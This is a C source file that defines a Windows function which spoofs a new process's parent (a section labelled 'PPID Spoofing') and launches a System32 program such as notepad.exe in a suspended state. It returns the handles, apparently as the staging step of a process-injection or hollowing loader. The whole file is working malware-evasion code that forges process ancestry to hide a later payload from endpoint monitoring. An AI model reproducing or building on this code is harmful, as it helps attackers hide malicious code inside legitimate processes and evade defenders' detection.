#include <Windows.h>
#include <stdio.h>
#include "Box.h"


BOOL CreateSuspendedProcess
(IN LPCSTR lpProcessName,
 OUT DWORD* dwProcessId,
 IN HANDLE hParent,
 OUT HANDLE* hProcess,
 OUT HANDLE* hThread)
{


	/*-----------------------------------------------------------------------------[Creating a Suspended Process]--------------------------------------------------*/


	CHAR lpPath[MAX_PATH * 2] = { 0 }; // This will store the full file path of notepad.exe
	CHAR WnDr[MAX_PATH] = { 0 }; //Holds the windows system directory path "C:\\Windows"

	SIZE_T                             sThreadAttList = NULL;
	LPPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList = NULL;

	STARTUPINFOEXA siEx = { 0 }; // info about how a new process should appear when calling functions
	PROCESS_INFORMATION pi = { 0 }; //receives info about newly created process

	RtlSecureZeroMemory(&siEx, sizeof(STARTUPINFOEXA)); // zeros out memory
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	/* Getting Path to execute program... */
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH))
	{
		WARN("GetEnvironmentVariableA Failed! With an Error: %d", GetLastError()); 
		return FALSE;
	}


	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);


	/*---------------------------------------------------------[PPID Spoofing]-----------------------------------------------------------------------*/


	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList); // setup the amount of buffer required

	pThreadAttList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList); // Allocate required memory
	if (pThreadAttList == NULL) {
		WARN("HeapAlloc Failed With Error : %d", GetLastError());
		return FALSE;
	}

	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) // Allocate the buffer
	{
		WARN("InitializeProcThreadAttributeList Failed With Error : %d", GetLastError());
		return FALSE;
	}


	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) // Update the list
	{
		WARN("UpdateProcThreadAttribute Failed With Error : %d", GetLastError());
		return FALSE;

	}

	/* Creating our suspended Process */
	siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	siEx.lpAttributeList = pThreadAttList;


	if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &siEx.StartupInfo, &pi)) // Create a notepad process with specific features.
	{
		WARN("CreateProcessA Failed! With an Error: %d", GetLastError());
		return FALSE;
	}

	OKAY("Successfully Created a Suspended Process of %s", lpProcessName);


	*dwProcessId = pi.dwProcessId;
	*hProcess = pi.hProcess;
	*hThread = pi.hThread;


	DeleteProcThreadAttributeList(pThreadAttList);

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;

}